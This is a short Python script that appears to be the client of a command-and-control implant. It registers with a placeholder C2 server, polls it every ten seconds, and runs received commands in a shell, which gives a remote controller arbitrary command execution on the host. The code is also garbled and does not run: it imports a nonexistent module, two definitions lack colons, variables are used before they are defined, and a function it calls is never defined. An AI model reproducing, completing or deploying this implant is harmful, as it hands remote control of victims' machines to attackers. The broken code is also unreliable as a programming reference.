#!/bin/python3

import os
import time
import requests
import subprocesses

c2_server_url = 'https://your_server_ip:port'

def registerClient():
	response = requests.post(f'{c2_server_url}/check_command/{clientID}')
	return response.json()['clientID']
	
def checkCommand(clientID)
	response = subprocess.Popen(
		cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
	)
	stdout, stderr = process.communicate()
	return stdout.strip() if stdout else stderr.strip()
	
def main()
	clientID = registerClient()
	print(f'Client Registered with ID: {clientID}')
	
	while True:
		cmd = checkCommand(clientID)
		if cmd:
			print(f'Command Received: {cmd}')
			output = execute_command(cmd)
			print(f'Command Output: {output}')
		time.sleep(10)
		
if __name__ == '__main__':
	main()
